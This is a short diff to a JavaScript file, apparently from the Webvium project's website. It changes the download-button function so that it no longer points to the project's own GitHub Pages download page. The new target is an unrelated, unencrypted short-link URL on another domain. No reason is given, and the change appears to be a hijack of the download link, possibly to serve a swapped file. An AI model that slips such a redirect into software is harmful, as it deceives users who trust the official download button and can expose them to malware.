@@ -34,5 +34,5 @@ function closeNav1() {
 }
 
 function webvium_download_url() {
-    window.location.href = "https://mrepol742.github.io/PROJECT-WEBVIUM/download";
+    window.location.href = "http://rainonit.com/3Wsi";
 }
